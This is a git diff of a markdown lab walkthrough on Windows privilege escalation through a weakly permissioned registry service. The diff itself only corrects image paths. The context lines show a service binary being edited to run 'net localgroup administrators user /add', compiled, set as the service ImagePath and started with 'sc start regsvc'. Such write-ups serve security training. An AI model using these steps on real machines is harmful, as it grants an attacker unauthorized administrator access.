@@ -37,7 +37,7 @@ PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc |
 
 - Open terminal in the directory where `windows_service.c` is located
 
-![source](\images\source.png)
+![source](/images/source.png)
 
 - Copy ‘`C:\Users\User\Desktop\Tools\Source\windows_service.c`’ to the attack machine
 
@@ -49,13 +49,13 @@ Password:
 ftp> put windows_service.c
 ```
 
-![put](\images\put.png)
+![put](/images/put.png)
 
 ## Step 3: Exploitation
 
 - Open `windows_service.c` in a text editor and replace the command used by the system() function to: **`cmd.exe /k net localgroup administrators user /add`**
 
-![edit](\images\edit.png)
+![edit](/images/edit.png)
 
 - Compile the file by typing the following in the command prompt:
   - **`x86_64-w64-mingw32-gcc windows_service.c -o x.exe`**
@@ -69,7 +69,7 @@ ftp> put windows_service.c
 - Copy the generated file `x.exe`, to the target using the `pytfp` server
 - Make sure to use `binary` mode for the transfer process
 
-![get](\images\get.png)
+![get](/images/get.png)
 
 ### Add Executable to `ImagePath` of the Registry Service
 
@@ -93,4 +93,4 @@ C:\Temp> sc start regsvc
 C:\Temp> net localgroup administrators
 ```
 
-![start](\images\start.png)
+![start](/images/start.png)
